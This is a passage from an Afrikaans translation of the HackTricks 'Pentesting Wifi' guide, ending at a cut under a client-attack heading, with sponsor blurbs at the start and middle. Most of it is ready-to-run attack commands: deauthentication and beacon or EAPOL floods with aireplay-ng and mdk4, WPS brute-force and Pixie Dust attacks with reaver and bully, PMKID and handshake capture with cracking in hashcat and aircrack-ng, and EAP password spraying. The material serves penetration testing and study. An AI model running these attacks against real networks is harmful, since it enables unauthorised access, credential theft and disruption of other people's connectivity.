# Pentesting Wifi

<details>

<summary><strong>Leer AWS hak vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling van eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PRs in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Sluit aan by [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) bediener om te kommunikeer met ervare hackers en foutbeloningsjagters!

**Hakinsigte**\
Gaan in gesprek met inhoud wat die opwinding en uitdagings van hak bevat

**Nuutste Haknuus**\
Bly op hoogte van die snelveranderende hakw√™reld deur middel van nuus en insigte in werkliktyd

**Nuutste Aankondigings**\
Bly ingelig met die nuutste foutbelonings wat bekendgestel word en belangrike platformopdaterings

**Sluit by ons aan op** [**Discord**](https://discord.com/invite/N3FrSbmwdy) en begin vandag saamwerk met top hackers! 

## Wifi basiese bevele
```bash
ip link show #List available interfaces
iwconfig #List available interfaces
airmon-ng check kill #Kill annoying processes
airmon-ng start wlan0 #Monitor mode
airmon-ng stop wlan0mon #Managed mode
airodump-ng wlan0mon #Scan (default 2.4Ghz)
airodump-ng wlan0mon --band a #Scan 5Ghz
airodump-ng wlan0mon --wps #Scan WPS
iwconfig wlan0 mode monitor #Put in mode monitor
iwconfig wlan0mon mode managed #Quit mode monitor - managed mode
iw dev wlan0 scan | grep "^BSS\|SSID\|WSP\|Authentication\|WPS\|WPA" #Scan available wifis
iwlist wlan0 scan #Scan available wifis
```
## Gereedskap

### EAPHammer
```
git clone https://github.com/s0lst1c3/eaphammer.git
./kali-setup
```
### Airgeddon

Airgeddon is 'n alles-in-een multi-operasionele skakelbord vir WiFi-aanvalle. Dit bied 'n omvattende raamwerk vir aanvalle op draadlose netwerke.
```bash
mv `which dhcpd` `which dhcpd`.old
apt install isc-dhcp-server
apt-get install sslstrip asleap bettercap mdk4 hostapd beef-xss lighttpd dsniff hostapd-wpe
```
**Hardloop airgeddon met docker**
```bash
docker run \
--rm \
-ti \
--name airgeddon \
--net=host \
--privileged \
-p 3000:3000 \
-v /tmp:/io \
-e DISPLAY=$(env | grep DISPLAY | awk -F "=" '{print $2}') \
v1s1t0r1sh3r3/airgeddon
```
### wifiphisher

Dit kan Evil Twin, KARMA, en Bekende Beacons aanvalle uitvoer en dan 'n phising-sjabloon gebruik om die netwerk se werklike wagwoord te verkry of sosiale netwerk geloofsbriewe vas te l√™.
```bash
git clone https://github.com/wifiphisher/wifiphisher.git # Download the latest revision
cd wifiphisher # Switch to tool's directory
sudo python setup.py install # Install any dependencies
```
### [Wifite2](https://github.com/derv82/wifite2)

Hierdie gereedskap outomatiseer **WPS/WEP/WPA-PSK** aanvalle. Dit sal outomaties:

* Stel die koppelvlak in monitor-modus
* Skandeer vir moontlike netwerke - En laat jou die slagoffer(s) kies
* As WEP - Lanceer WEP aanvalle
* As WPA-PSK
* As WPS: Pixie dust aanval en die bruteforce aanval (wees versigtig, die bruteforce aanval kan 'n lang tyd neem). Let daarop dat dit nie nul PIN of databasis/gegenereerde PINs probeer nie.
* Probeer om die PMKID van die AP vas te vang om dit te kraak
* Probeer om kli√´nte van die AP te deautentiseer om 'n handshake vas te vang
* As PMKID of Handshake, probeer om te bruteforce met behulp van top5000 wagwoorde.

## Aanvalle Opsomming

* **DoS**
* Deautentisering/ontkoppeling -- Ontkoppel almal (of 'n spesifieke ESSID/Kli√´nt)
* Lukrake valse AP's -- Versteek netwerke, moontlike skandeerders wat laat vasloop
* Oorlading AP -- Probeer om die AP te laat afgaan (gewoonlik nie baie nuttig nie)
* WIDS -- Speel met die IDS
* TKIP, EAPOL -- Sekere spesifieke aanvalle om sommige AP's te DoS
* **Kraak**
* Kraak **WEP** (verskeie gereedskappe en metodes)
* **WPA-PSK**
* **WPS** pin "Brute-Force"
* **WPA PMKID** bruteforce
* \[DoS +] **WPA handshake** vasvang + Kraak
* **WPA-MGT**
* **Gebruikersnaam vasvang**
* **Bruteforce** Gelde
* **Bose Tweeling** (met of sonder DoS)
* **Oop** Bose Tweeling \[+ DoS] -- Nuttig om gevangene portaal gelde vas te vang en/of LAN aanvalle uit te voer
* **WPA-PSK** Bose Tweeling -- Nuttig vir netwerkaanvalle as jy die wagwoord weet
* **WPA-MGT** -- Nuttig om maatskappy gelde vas te vang
* **KARMA, MANA**, **Luid MANA**, **Bekende baken**
* **+ Oop** -- Nuttig om gevangene portaal gelde vas te vang en/of LAN aanvalle uit te voer
* **+ WPA** -- Nuttig om WPA handshakes vas te vang

## DOS

### Deautentiseringspakette

**Beskrywing van** [**hier**:](https://null-byte.wonderhowto.com/how-to/use-mdk3-for-advanced-wi-fi-jamming-0185832/)**.**

**Deautentiserings** aanvalle, 'n algemene metode in Wi-Fi hak, behels die vervalsing van "bestuurs" rame om toestelle kragtig van 'n netwerk af te koppel. Hierdie onversleutelde pakkette mislei kli√´nte om te glo dat hulle van die regte netwerk afkomstig is, wat aanvallers in staat stel om WPA handshakes vir kraakdoeleindes te versamel of om aanhoudend netwerkverbindings te ontwrig. Hierdie taktiek, verontrustend in sy eenvoud, word wyd gebruik en het beduidende implikasies vir netwerksekuriteit.

**Deautentisering deur Aireplay-ng**
```
aireplay-ng -0 0 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 ath0
```
* \-0 beteken deautentifikasie
* 1 is die aantal deautentifikasies om te stuur (jy kan meerdere stuur indien jy wil); 0 beteken stuur hulle deurentyd
* \-a 00:14:6C:7E:40:80 is die MAC-adres van die toegangspunt
* \-c 00:0F:B5:34:30:30 is die MAC-adres van die kli√´nt om te deautentifiseer; as dit weggelaat word, word uitsaaideautentifikasie gestuur (werk nie altyd nie)
* ath0 is die koppelvlaknaam

### Ontkoppelingspakette

**Ontkoppelingspakette**, soortgelyk aan deautentifikasiepakette, is 'n tipe bestuursraamwerk wat in Wi-Fi-netwerke gebruik word. Hierdie pakkette dien om die verbinding tussen 'n toestel (soos 'n draagbare rekenaar of slimfoon) en 'n toegangspunt (AP) te verbreek. Die prim√™re onderskeid tussen ontkoppeling en deautentifikasie l√™ in hul gebruikscenario's. Terwyl 'n AP **deautentifikasiepakette uitsaai om kwaadwillige toestelle eksplisiet van die netwerk te verwyder, word ontkoppelingspakette tipies gestuur wanneer die AP 'n afsluiting, herlaaiing of herlokalisering ondergaan, wat dus die ontkoppeling van alle gekoppelde knooppunte noodsaaklik maak.

**Hierdie aanval kan uitgevoer word deur mdk4 (modus "d"):**
```bash
# -c <channel>
# -b victim_client_mac.txt contains the MAC address of the device to eliminate
# -e WifiName is the name of the wifi
# -B BSSID is the BSSID of the AP
# Notice that these and other parameters aare optional, you could give onli the ESSID and md4k will automatically search for it, wait for finding clients and deauthenticate them
mdk4 wlan0mon d -c 5 -b victim_client_mac.txt -E WifiName -B EF:60:69:D7:69:2F
```
### **Meer DOS-aanvalle deur mdk4**

**In** [**hier**](https://en.kali.tools/?p=864)**.**

**AANVALMODUS b: Beacon-oorstroming**

Stuur bakenskemas om valse AP's aan kli√´nte te wys. Dit kan soms netwerk-skandeerders selfs laat vasloop en bestuurders laat misluk!
```bash
# -a Use also non-printable caracters in generated SSIDs and create SSIDs that break the 32-byte limit
# -w n (create Open) t (Create WPA/TKIP) a (Create WPA2/AES)
# -m use real BSSIDS
# All the parameters are optional and you could load ESSIDs from a file
mdk4 wlan0mon b -a -w nta -m
```
**AANVALMODUS a: Verifikasie-ontkenning-van-diens**

Die stuur van verifikasie-rame na alle toeganklike Toegangspunte (AP's) binne bereik kan hierdie AP's oorl√™, veral wanneer talle kli√´nte betrokke is. Hierdie intense verkeer kan lei tot sisteem-onstabiliteit, wat veroorsaak dat sommige AP's vries of selfs herstel.
```bash
# -a BSSID send random data from random clients to try the DoS
# -i BSSID capture and repeat pakets from authenticated clients
# -m use real MACs
# only -a or -i can be used
mdk4 wlan0mon a [-i EF:60:69:D7:69:2F] [-a EF:60:69:D7:69:2F] -m
```
**AANVALMODUS p: SSID-Ondersoek en Bruteforcing**

Ondersoek van Toegangspunte (AP's) toets of 'n SSID behoorlik onthul word en bevestig die AP se reikwydte. Hierdie tegniek, gekoppel met **bruteforcing van verskuilde SSID's** met of sonder 'n woordelys, help om verskuilde netwerke te identifiseer en toegang tot hulle te verkry.

**AANVALMODUS m: Michael Teenmaatre√´ls Uitbuiting**

Die stuur van lukrake of duplikaat pakkies na verskillende QoS-rye kan Michael Teenmaatre√´ls op **TKIP AP's** in werking stel, wat tot 'n eenminuut-AP-afsluiting kan lei. Hierdie metode is 'n doeltreffende **DoS** (Ontkenning van Diens) aanvalstegniek.
```bash
# -t <BSSID> of a TKIP AP
# -j use inteligent replay to create the DoS
mdk4 wlan0mon m -t EF:60:69:D7:69:2F [-j]
```
**AANVALMODUS e: EAPOL Begin- en Aflaai-pakketinspuiting**

Die oorlaai van 'n AP met **EAPOL Begin-rame** skep **vals sessies**, wat die AP oorweldig en legitieme kli√´nte blokkeer. Alternatiewelik, deur **vals EAPOL Aflaai-boodskappe** in te spuit, word kli√´nte kragtig afgekoppel, beide metodes versteur netwerkdienste effektief.
```bash
# Use Logoff messages to kick clients
mdk4 wlan0mon e -t EF:60:69:D7:69:2F [-l]
```
**AANVALMODUS s: Aanvalle vir IEEE 802.11s mas-netwerke**

Verskeie aanvalle op skakelbestuur en roeteverandering in mas-netwerke.

**AANVALMODUS w: WIDS Verwarring**

Kruiskoppel van kli√´nte aan verskeie WDS-node of valse skelm AP's kan Intrusie Deteksie en Voorkomingsstelsels manipuleer, verwarring skep en potensi√´le sisteemmisbruik.
```bash
# -z activate Zero_Chaos' WIDS exploit (authenticates clients from a WDS to foreign APs to make WIDS go nuts)
mkd4 -e <SSID> -c <channel> [-z]
```
**AANVALMODUS f: Pakket Fuzzer**

'n Pakket fuzzer wat diverse pakketbronne en 'n omvattende stel veranderlikes vir pakketmanipulasie bied.

### **Airggedon**

_**Airgeddon**_ bied die meeste van die aanvalle wat voorgestel is in die vorige opmerkings:

![](<../../.gitbook/assets/image (95).png>)

## WPS

WPS (Wi-Fi Protected Setup) vereenvoudig die proses om toestelle aan 'n router te koppel, verbeter die opstellingspoed en gemak vir netwerke wat versleutel is met **WPA** of **WPA2** Persoonlik. Dit is ondoeltreffend vir die maklik gekompromitteerde WEP-sekuriteit. WPS gebruik 'n 8-syfer-PIN, wat in twee helftes geverifieer word, wat dit vatbaar maak vir brute force-aanvalle as gevolg van sy beperkte aantal kombinasies (11,000 moontlikhede).

### WPS Brute Force

Daar is 2 hoofgereedskap om hierdie aksie uit te voer: Reaver en Bully.

* **Reaver** is ontwerp om 'n robuuste en praktiese aanval teen WPS te wees, en is getoets teen 'n wye verskeidenheid toegangspunte en WPS-implementasies.
* **Bully** is 'n **nuwe implementasie** van die WPS brute force-aanval, geskryf in C. Dit het verskeie voordele bo die oorspronklike reaver-kode: minder afhanklikhede, verbeterde geheue- en CPU-prestasie, korrekte hantering van endianness, en 'n meer robuuste stel opsies.

Die aanval maak gebruik van die **kwesbaarheid van die WPS-PIN**, veral die blootstelling van die eerste vier syfers en die laaste syfer se rol as 'n kontrolesom, wat die brute force-aanval vergemaklik. Tog vereis verdedigings teen brute force-aanvalle, soos **blokkering van MAC-adresse** van aggressiewe aanvallers, **MAC-adresrotasie** om die aanval voort te sit.

Na die verkryging van die WPS-PIN met gereedskap soos Bully of Reaver, kan die aanvaller die WPA/WPA2 PSK aflei, wat **volgehoue netwerktoegang** verseker.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -b -f -N [-L -d 2] -vvroot
bully wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -S -F -B -v 3
```
**Slim Brute Force**

Hierdie verfynne benadering teiken WPS PINs deur bekende kwesbaarhede te gebruik:

1. **Vooraf ontdekte PINs**: Maak gebruik van 'n databasis van bekende PINs wat gekoppel is aan spesifieke vervaardigers wat bekend is om uniforme WPS PINs te gebruik. Hierdie databasis koppel die eerste drie oktet van MAC-adresse aan waarskynlike PINs vir hierdie vervaardigers.
2. **PIN-generasie-algoritmes**: Benut algoritmes soos ComputePIN en EasyBox, wat WPS PINs bereken gebaseer op die AP se MAC-adres. Die Arcadyan-algoritme vereis addisioneel 'n toestel-ID, wat 'n laag tot die PIN-generasieproses byvoeg.

### WPS Pixie Dust-aanval

**Dominique Bongard** het 'n fout ontdek in sommige Toegangspunte (AP's) rakende die skep van geheime kodes, bekend as **nonce** (**E-S1** en **E-S2**). As hierdie nonces uitgewerk kan word, word dit maklik om die AP se WPS PIN te kraak. Die AP onthul die PIN binne 'n spesiale kode (hash) om te bewys dat dit legitiem is en nie 'n vervalsing (skelm) AP is nie. Hierdie nonces is essensieel die "sleutels" om die "kluis" wat die WPS PIN bevat, te ontsluit. Meer hieroor kan [hier](https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-\(Offline-WPS-Attack\)) gevind word.

In eenvoudige terme is die probleem dat sommige AP's nie genoeg random sleutels gebruik het vir die enkripsie van die PIN tydens die verbindingsproses nie. Dit maak die PIN vatbaar om van buite die netwerk geradeer te word (aflyn brute force-aanval).
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -K 1 -N -vv
bully  wlan1mon -b 00:C0:CA:78:B1:37 -d -v 3
```
Indien jy nie die toestel wil oorskakel na monitor-modus nie, of `reaver` en `bully` het 'n probleem, kan jy [OneShot-C](https://github.com/nikita-yfh/OneShot-C) probeer. Hierdie gereedskap kan 'n Pixie Dust-aanval uitvoer sonder om na monitor-modus oor te skakel.
```bash
./oneshot -i wlan0 -K -b 00:C0:CA:78:B1:37
```
### Nul Pin-aanval

Sommige swak ontwerpte stelsels laat selfs 'n **Nul PIN** ( 'n le√´ of nie-bestaande PIN) toegang verleen, wat nogal ongewoon is. Die instrument **Reaver** is in staat om hierdie kwesbaarheid te toets, in teenstelling met **Bully**.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -f -N -g 1 -vv -p ''
```
### Airgeddon

Al die voorgestelde WPS-aanvalle kan maklik uitgevoer word met _**airgeddon.**_

![](<../../.gitbook/assets/image (219).png>)

* 5 en 6 laat jou toe om **jou eie PIN** te probeer (as jy een het)
* 7 en 8 voer die **Pixie Dust-aanval** uit
* 13 laat jou toe om die **NULL PIN** te toets
* 11 en 12 sal die PINs wat verband hou met die gekose AP van beskikbare databasisse **herwin** en moontlike **PINs genereer** met behulp van: ComputePIN, EasyBox en opsioneel Arcadyan (aanbeveel, hoekom nie?)
* 9 en 10 sal elke moontlike PIN toets

## **WEP**

So gebreek en ongebruik deesdae. Weet net dat _**airgeddon**_ 'n WEP-opsie genaamd "All-in-One" het om hierdie soort beskerming aan te val. Meer gereedskap bied soortgelyke opsies aan.

![](<../../.gitbook/assets/image (432).png>)

***

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Sluit aan by [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) bediener om met ervare hackers en foutbeloningsjagters te kommunikeer!

**Hack-insigte**\
Gaan in gesprek met inhoud wat die opwinding en uitdagings van hack bekyk

**Hack Nuus in Werklikheid**\
Bly op hoogte van die vinnige hack-w√™reld deur middel van nuus en insigte in werklikheid

**Nuutste Aankondigings**\
Bly ingelig met die nuutste foutbelonings wat bekendgestel word en kritieke platformopdaterings

**Sluit by ons aan op** [**Discord**](https://discord.com/invite/N3FrSbmwdy) en begin vandag saamwerk met top hackers!

***

## WPA/WPA2 PSK

### PMKID

In 2018 het **hashcat** [bekend gemaak](https://hashcat.net/forum/thread-7717.html) 'n nuwe aanvalsmetode, uniek omdat dit slegs **een enkele pakkie** benodig en nie vereis dat enige kli√´nte met die teiken-AP verbind moet wees nie‚Äînet interaksie tussen die aanvaller en die AP.

Baie moderne routers voeg 'n **opsionele veld** by die **eerste EAPOL**-raam tydens assosiasie, bekend as `Robust Security Network`. Dit sluit die `PMKID` in.

Soos die oorspronklike pos verduidelik, word die **PMKID** geskep met bekende data:
```bash
PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)
```
Gegewe dat die "PMK-naam" konstant is, weet ons die BSSID van die AP en die stasie, en die `PMK` is identies aan di√© van 'n volledige 4-weg-handshaking, kan **hashcat** hierdie inligting gebruik om die PSK te kraak en die wagwoord te herwin!

Om hierdie inligting te **versamel** en plaaslik die wagwoord te **brute force**, kan jy doen:
```bash
airmon-ng check kill
airmon-ng start wlan0
git clone https://github.com/ZerBea/hcxdumptool.git; cd hcxdumptool; make; make install
hcxdumptool -o /tmp/attack.pcap -i wlan0mon --enable_status=1
```

```bash
#You can also obtains PMKIDs using eaphammer
./eaphammer --pmkid --interface wlan0 --channel 11 --bssid 70:4C:A5:F8:9A:C1
```
Die **PMKIDs wat gevang is**, sal in die **konsole** vertoon word en ook **gestoor** word binne \_ **/tmp/aanval.pcap**\_\
Nou, omskep die vangs na **hashcat/john** formaat en kraak dit:
```bash
hcxtools/hcxpcaptool -z hashes.txt /tmp/attack.pcapng
hashcat -m 16800 --force hashes.txt /usr/share/wordlists/rockyou.txt
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
Let asseblief daarop dat die formaat van 'n korrekte has **4 dele** bevat, soos: `4017733ca8db33a1479196c2415173beb808d7b83cfaa4a6a9a5aae7566f6461666f6e65436f6e6e6563743034383131343838` As joune **slegs 3 dele** bevat, dan is dit **ongeldig** (die PMKID-vangste was nie geldig nie).

Merk op dat `hcxdumptool` ook handskrifte vasvang (iets soos hierdie sal verskyn: **`MP:M1M2 RC:63258 EAPOLTIME:17091`**). Jy kan die handskrifte na **hashcat**/**john**-formaat omskep met behulp van `cap2hccapx`
```bash
tcpdump -r /tmp/attack.pcapng -w /tmp/att.pcap
cap2hccapx pmkid.pcapng pmkid.hccapx ["Filter_ESSID"]
hccap2john pmkid.hccapx > handshake.john
john handshake.john --wordlist=/usr/share/wordlists/rockyou.txt
aircrack-ng /tmp/att.pcap -w /usr/share/wordlists/rockyou.txt #Sometimes
```
_Ek het opgemerk dat sommige handskrifte wat met hierdie instrument vasgel√™ is, selfs met die regte wagwoord nie gekraak kon word nie. Ek sal aanbeveel om handskrifte ook op 'n tradisionele manier vas te l√™ indien moontlik, of om verskeie daarvan met behulp van hierdie instrument vas te l√™._

### Handskrif vasl√™

'n Aanval op **WPA/WPA2**-netwerke kan uitgevoer word deur 'n **handskryf** vas te l√™ en te probeer om die wagwoord **offline** te **kraak**. Hierdie proses behels die monitorering van die kommunikasie van 'n spesifieke netwerk en **BSSID** op 'n bepaalde **kanaal**. Hier is 'n gestroomlynnde gids:

1. Identifiseer die **BSSID**, **kanaal**, en 'n **verbonde kli√´nt** van die teiken netwerk.
2. Gebruik `airodump-ng` om die netwerkverkeer op die gespesifiseerde kanaal en BSSID te monitor, in die hoop om 'n handskrif vas te l√™. Die bevel sal soos volg lyk:
```bash
airodump-ng wlan0 -c 6 --bssid 64:20:9F:15:4F:D7 -w /tmp/psk --output-format pcap
```
3. Om die kans te verhoog om 'n handdruk vas te vang, verbreek die klient tydelik van die netwerk om 'n her-autentisering af te dwing. Dit kan gedoen word deur die `aireplay-ng` bevel te gebruik, wat de-autentiseringspakkies na die klient stuur:
```bash
aireplay-ng -0 0 -a 64:20:9F:15:4F:D7 wlan0 #Send generic deauth packets, may not work in all scenarios
```
_Merk op dat aangesien die klient gedeautentiseer was, dit kan probeer om met 'n ander AP te verbind of, in ander gevalle, met 'n ander netwerk._

Sodra die `airodump-ng` 'n handskrifinligting toon, beteken dit dat die handskrif vasgel√™ is en jy kan ophou luister:

![](<../../.gitbook/assets/image (172) (1).png>)

Sodra die handskrif vasgel√™ is, kan jy dit **kraak** met `aircrack-ng`:
```
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 64:20:9F:15:4F:D7 /tmp/psk*.cap
```
### Kontroleer of handdruk in l√™er

**aircrack**
```bash
aircrack-ng psk-01.cap #Search your bssid/essid and check if any handshake was capture
```
**tshark**
```bash
tshark -r psk-01.cap -n -Y eapol #Filter handshake messages #You should have the 4 messages.
```
[**cowpatty**](https://github.com/roobixx/cowpatty)
```
cowpatty -r psk-01.cap -s "ESSID" -f -
```
_Indien hierdie instrument 'n onvoltooide handdruk van 'n ESSID vind voordat die voltooide een, sal dit nie die geldige een opspoor nie._

**pyrit**
```bash
apt-get install pyrit #Not working for newer versions of kali
pyrit -r psk-01.cap analyze
```
## **WPA Enterprise (MGT)**

In **ondernemings WiFi-opstelle, sal jy verskeie verifikasiemetodes te√´kom**, wat elk verskillende sekuriteitsvlakke en bestuurskenmerke bied. Wanneer jy gereedskap soos `airodump-ng` gebruik om netwerkverkeer te inspekteer, mag jy identifiseerders vir hierdie verifikasietipes opmerk. Enkele algemene metodes sluit in:
```
6A:FE:3B:73:18:FB  -58       19        0    0   1  195  WPA2 CCMP   MGT  NameOfMyWifi
```
1. **EAP-GTC (Generic Token Card)**:
* Hierdie metode ondersteun hardeware tokens en eenmalige wagwoorde binne EAP-PEAP. Anders as MSCHAPv2, gebruik dit nie 'n ewekansige uitdaging nie en stuur wagwoorde in teks na die toegangspunt, wat 'n risiko vir afgradeer aanvalle inhou.
2. **EAP-MD5 (Boodskap Digest 5)**:
* Behels die stuur van die MD5-hash van die wagwoord van die klient. Dit word **nie aanbeveel** weens die kwesbaarheid vir woordeboekaanvalle, gebrek aan bedienerverifikasie, en onvermo√´ om sessiespesifieke WEP-sleutels te genereer.
3. **EAP-TLS (Transportlaag-sekuriteit)**:
* Maak gebruik van beide klient- en bedienersertifikate vir verifikasie en kan dinamies gebruikersgebaseerde en sessiegebaseerde WEP-sleutels genereer vir die beveiliging van kommunikasie.
4. **EAP-TTLS (Getunnelde Transportlaag-sekuriteit)**:
* Bied wedersydse verifikasie deur 'n versleutelde tonnel, saam met 'n metode om dinamiese, per-gebruiker, per-sessie WEP-sleutels af te lei. Dit vereis slegs bedienersertifikate, met kliente wat geloofsbriewe gebruik.
5. **PEAP (Beskermde Uitbreibare Verifikasieprotokol)**:
* Werk soortgelyk aan EAP deur 'n TLS-tonnel vir beskermde kommunikasie te skep. Dit maak die gebruik van swakker verifikasieprotokolle bo-op EAP moontlik as gevolg van die beskerming wat deur die tonnel gebied word.
* **PEAP-MSCHAPv2**: Dikwels verwys na as PEAP, dit kombineer die kwesbare MSCHAPv2-uitdaging/reaksiemeganisme met 'n beskermende TLS-tonnel.
* **PEAP-EAP-TLS (of PEAP-TLS)**: Soortgelyk aan EAP-TLS, maar inisieer 'n TLS-tonnel voordat sertifikate uitgeruil word, wat 'n addisionele laag van sekuriteit bied.

Jy kan meer inligting oor hierdie verifikasiemetodes [hier](https://en.wikipedia.org/wiki/Extensible\_Authentication\_Protocol) en [hier](https://www.intel.com/content/www/us/en/support/articles/000006999/network-and-i-o/wireless-networking.html) vind.

### Gebruikersnaam Vaslegging

Deur [https://tools.ietf.org/html/rfc3748#page-27](https://tools.ietf.org/html/rfc3748#page-27) te lees, lyk dit asof as jy **EAP** gebruik, moet die **"Identiteit"** **boodskappe** **ondersteun** word, en die **gebruikersnaam** sal in die **"Reaksie Identiteit"** boodskappe in **teks** gestuur word.

Selfs al gebruik jy een van die mees veilige verifikasiemetodes: **PEAP-EAP-TLS**, is dit moontlik om die gebruikersnaam wat in die EAP-protokol gestuur word, **vas te l√™**. Om dit te doen, **vang 'n verifikasiekommunikasie** (begin `airodump-ng` binne 'n kanaal en `wireshark` in dieselfde koppelvlak) en filtreer die pakkies met `eapol`.\
Binne die "**Reaksie, Identiteit**" pakkie, sal die **gebruikersnaam** van die klient verskyn.

![](<../../.gitbook/assets/image (850).png>)

### Anonieme Identiteite

Identiteitshiding word ondersteun deur beide EAP-PEAP en EAP-TTLS. In die konteks van 'n WiFi-netwerk, word 'n EAP-Identiteit versoek tipies deur die toegangspunt (AP) ge√Ønisieer gedurende die assosiasieproses. Om die beskerming van gebruikersanonimiteit te verseker, bevat die reaksie van die EAP-klient op die gebruiker se toestel slegs die noodsaaklike inligting wat benodig word vir die aanvanklike RADIUS-bedieners om die versoek te verwerk. Hierdie konsep word ge√Øllustreer deur die volgende scenario's:

* EAP-Identiteit = anoniem
* In hierdie scenario gebruik alle gebruikers die psudoniem "anoniem" as hul gebruikersidentifiseerder. Die aanvanklike RADIUS-bedieners funksioneer as √≥f 'n EAP-PEAP √≥f EAP-TTLS-bediener, verantwoordelik vir die bestuur van die bedienerskant van die PEAP- of TTLS-protokol. Die binne (beskermde) verifikasiemetode word dan √≥f plaaslik hanteer √≥f gedelegeer na 'n afgele√´ (tuis) RADIUS-bediener.
* EAP-Identiteit = anoniem@realm\_x
* In hierdie situasie verberg gebruikers uit verskillende realms hul identiteite terwyl hulle hul onderskeie realms aandui. Dit maak dit vir die aanvanklike RADIUS-bedieners moontlik om die EAP-PEAP- of EAP-TTLS-versoeke na RADIUS-bedieners in hul tuisrealms te stuur, wat as die PEAP- of TTLS-bediener optree. Die aanvanklike RADIUS-bedieners funksioneer slegs as 'n RADIUS-relaisnode.
* Alternatiewelik kan die aanvanklike RADIUS-bedieners as die EAP-PEAP- of EAP-TTLS-bediener funksioneer en die beskermde verifikasiemetode hanteer of dit na 'n ander bediener stuur. Hierdie opsie fasiliteer die konfigurasie van onderskeie beleide vir verskeie realms.

In EAP-PEAP, sodra die TLS-tonnel tussen die PEAP-bedieners en die PEAP-klient opgerig is, inisieer die PEAP-bedieners 'n EAP-Identiteit versoek en stuur dit deur die TLS-tonnel. Die klient reageer op hierdie tweede EAP-Identiteit versoek deur 'n EAP-Identiteit reaksie te stuur wat die ware identiteit van die gebruiker deur die versleutelde tonnel bevat. Hierdie benadering voorkom doeltreffend die bekendmaking van die gebruiker se werklike identiteit aan enigiemand wat na die 802.11-verkeer luister.

EAP-TTLS volg 'n effens ander prosedure. Met EAP-TTLS verifieer die klient tipies deur PAP of CHAP te gebruik, beveilig deur die TLS-tonnel. In hierdie geval sluit die klient 'n Gebruikersnaam-eienskap en √≥f 'n Wagwoord √≥f CHAP-Wagwoord-eienskap in die aanvanklike TLS-boodskap in wat na die tonneloprigting gestuur word.

Ongeag die gekose protokol, verkry die PEAP/TTLS-bedieners kennis van die gebruiker se ware identiteit nadat die TLS-tonnel opgerig is. Die ware identiteit kan voorgestel word as gebruiker@realm of eenvoudigweg gebruiker. As die PEAP/TTLS-bedieners ook verantwoordelik is vir die verifikasie van die gebruiker, beskik dit nou oor die gebruiker se identiteit en gaan voort met die verifikasiemetode wat deur die TLS-tonnel beskerm word. Alternatiewelik kan die PEAP/TTLS-bedieners 'n nuwe RADIUS-versoek na die gebruiker se tuis-RADIUS-bedieners stuur. Hierdie nuwe RADIUS-versoek sluit die PEAP- of TTLS-protokollaag uit. In gevalle waar die beskermde verifikasiemetode EAP is, word die binne EAP-boodskappe na die tuis-RADIUS-bedieners gestuur sonder die EAP-PEAP- of EAP-TTLS-omhulsel. Die Gebruikersnaam-eienskap van die uitgaande RADIUS-boodskap bevat die gebruiker se ware identiteit, wat die anonieme Gebruikersnaam van die inkomende RADIUS-versoek vervang. Wanneer die beskermde verifikasiemetode PAP of CHAP is (slegs ondersteun deur TTLS), word die Gebruikersnaam en ander verifikasie-eienskappe wat uit die TLS-lading onttrek is, in die uitgaande RADIUS-boodskap vervang, wat die anonieme Gebruikersnaam en TTLS EAP-Boodskap-eienskappe wat in die inkomende RADIUS-versoek gevind is, verplaas.

Vir meer inligting, besoek [https://www.interlinknetworks.com/app\_notes/eap-peap.htm](https://www.interlinknetworks.com/app\_notes/eap-peap.htm)

### EAP-Bruteforce (wagwoordspuit)

As daar van die klient verwag word om 'n **gebruikersnaam en wagwoord** te gebruik (let daarop dat **EAP-TLS nie geldig sal wees** in hierdie geval nie), kan jy probeer om 'n **lys** van **gebruikersname** (sien volgende deel) en **wagwoorde** te kry en die toegang te **spuit** met behulp van [**air-hammer**](https://github.com/Wh1t3Rh1n0/air-hammer)**.**
```bash
./air-hammer.py -i wlan0 -e Test-Network -P UserPassword1 -u usernames.txt
```
Jy kan ook hierdie aanval uitvoer met behulp van `eaphammer`:
```bash
./eaphammer --eap-spray \
--interface-pool wlan0 wlan1 wlan2 wlan3 wlan4 \
--essid example-wifi \
--password bananas \
--user-list users.txt
```
## Kli√´ntaanvalle Teorie

### Netwerkkeuse en Roaming

* Die 802.11-protokol definieer hoe 'n stasie by 'n Uitgebreide Diensstel (ESS) aansluit, maar spesifiseer nie die kriteria vir die keuse van 'n ESS of 'n toegangspunt (AP) daarin nie.
* Stasies kan tussen AP's wat dieselfde ESSID deel, rondloop, en sodoende konnektiwiteit regdeur 'n gebou of area handhaaf.
* Die protokol vereis stasie-outentifikasie aan die ESS, maar nie AP-outentifikasie aan die stasie nie.

### Voorkeur Netwerklyste (PNL's)

